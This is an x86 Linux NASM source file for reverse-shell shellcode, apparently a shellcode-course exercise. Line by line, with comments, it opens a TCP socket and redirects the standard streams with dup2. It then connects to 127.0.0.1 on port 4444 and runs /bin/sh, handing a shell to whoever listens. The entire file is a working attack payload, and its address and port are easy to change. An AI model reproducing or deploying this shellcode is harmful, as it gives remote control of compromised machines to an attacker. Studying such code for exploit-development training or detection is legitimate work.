; Filename: ShellReverse.nasm
; Author: Jeremy Catelain

global _start

section .text
_start:
	
	; SOCKET
	
	; EBX
	xor ebx, ebx
	push ebx ; push the x00000000 on the stack
	
	inc ebx ; SYS_SOCKET call 1 for socket
	push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
	
	; ECX
	push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
	mov ecx, esp ; put the arguments of the socketcall into ECX

	; EAX
	xor eax, eax
	mov al, 0x66

	; socket call
	int 0x80

	mov esi, eax ; Save the File descriptor
	
	; DUP
	; EBX, File descriptor return by SOCKET call
	mov ebx, eax	; Retrieve the file descriptor
	
	; EAX, dup2 sys call 0x3f
	xor eax, eax
	
	; initialize ECX 
	mov ecx, 0x2

	; LOOP
DupLoop :
	 
	mov al, 0x3f
	int 0x80
	dec ecx
	jns DupLoop	


	; CONNECT
	; EBX ; SYS_CONNECT = 3
	xor ebx, ebx
	mov bl, 0x3

	; ECX, To modify
	; Creation of the struct sockaddr_in
	
	; //////////////// Listening address ////////////
	; Description: Set up the address to listen to
	; Example : 
	; 	push edi ; Push on the stack the address 0.0.0.0
	; 	push 0x00000000 ; Same
	push 0x0100007f ; 127.0.0.1

	; /////////////// Listening port ///////////////
	; Description : Set up the port to listen to
	; Example : push word 0x5c11 ; Push on the stack the port 4444
	push word 0x5c11	
	
	push word 0x2 ; Push the Family AF_INET = 2
	mov ecx, esp ; mov the structure into ecx
	
	; put all parameters into ECX 
		
	push byte 0x10 ; Push on the stack the address length of 16
	push ecx
	push esi ; push the file descriptor
	mov ecx, esp ; Move the stack into ECX
	
	; EAX
	xor eax, eax
	mov al, 0x66
	
	; connect call
	int 0x80
	


	; EXECVE /bin/sh	
	; Push the 0x00000000 on the stack
	xor eax, eax
	push eax
	
	; put the string on the stack
	push 0x68732f2f ; //sh : hs// : 68732f2f	
	push 0x6e69622f ; /bin : nib/ : 6e69622f	
	
	; setup EBX with the value of ESP
	mov ebx, esp

	; set up EDX and push null bytes again
	push eax
	mov edx, esp

	; set up ECX argv address on the first dw and null in second dw
	push ebx 
	; Then move the top of the stack into ECX
	mov ecx, esp

	; EAX
	mov al, 0xb
	int 0x80
	
	
	



	
